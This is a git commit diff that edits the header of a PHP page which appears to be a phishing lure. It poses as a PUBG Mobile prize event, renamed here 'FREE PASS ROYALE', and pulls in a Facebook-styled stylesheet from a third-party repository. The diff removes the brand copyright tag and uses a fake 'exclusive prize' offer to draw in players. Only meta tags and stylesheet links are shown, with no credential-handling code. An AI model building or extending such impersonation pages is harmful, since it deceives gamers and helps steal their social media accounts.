8cce64d457e4cd5d660a3d7276f6b37ecae25a2e
ahmed-shamy <73703631+ahmed-shamy@users.noreply.github.com>
2020-12-19 21:26:23 +0100

    Update and rename F.php to F/index.php

--- F/index.php
+++ F/index.php
@@ -3,16 +3,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta property="og:title" content="PUBG MOBILE SEASON 16">
+<meta property="og:title" content="FREE PASS ROYALE">
 <meta name="description" content="Latest PUBG MOBILE Event. Get an exclusive SEASON 16 prize !!!">
 <meta property="og:description" content="Latest PUBG MOBILE Event. Get an exclusive SEASON 16 prize !!!">
 <meta property="og:url" content="./">
-<meta property="og:site_name" content="PUBG MOBILE SEASON 16">
+<meta property="og:site_name" content="FREE PASS ROYALE">
 <meta property="og:type" content="website">
-<meta name="copyright"content="PUBG MOBILE">
 <meta name="theme-color" content="#000">
 <meta property="og:image" content="https://g.top4top.io/p_1706f9c4l1.jpg">
-<title>PUBG MOBILE SEASON 16</title>
+<title>FREE PASS ROYALE</title>
 <link rel="stylesheet" href="https://raw.githack.com/SoKy-Master/pubg/master/ts.css">
 <link rel="stylesheet" href="https://raw.githack.com/SoKy-Master/PubgMobile/master/animate.css">
 <link rel="stylesheet" href="https://raw.githack.com/SoKy-Master/PubgMobile/master/facebook.css">
